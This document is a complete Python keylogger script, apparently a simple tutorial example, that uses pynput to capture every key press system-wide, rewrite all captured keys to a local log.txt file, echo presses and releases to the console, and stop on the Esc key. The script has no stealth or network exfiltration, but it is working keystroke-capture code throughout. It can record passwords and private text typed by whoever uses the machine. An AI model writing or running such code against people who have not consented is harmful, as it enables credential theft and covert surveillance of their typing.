import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    # Add the pressed key to the 'keys' list
    keys.append(key)
    write_file(keys)

    try:
        # Print the pressed alphanumeric key
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        # Print the pressed special key
        print("Special key {0} pressed".format(key))

def write_file(keys):
    # Write the recorded keys to the log.txt file
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write('')

def on_release(key):
    # Print the released key
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop the keylogger if the 'esc' key is pressed
        return False

# Set up the key listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start listening for key events
    listener.join()
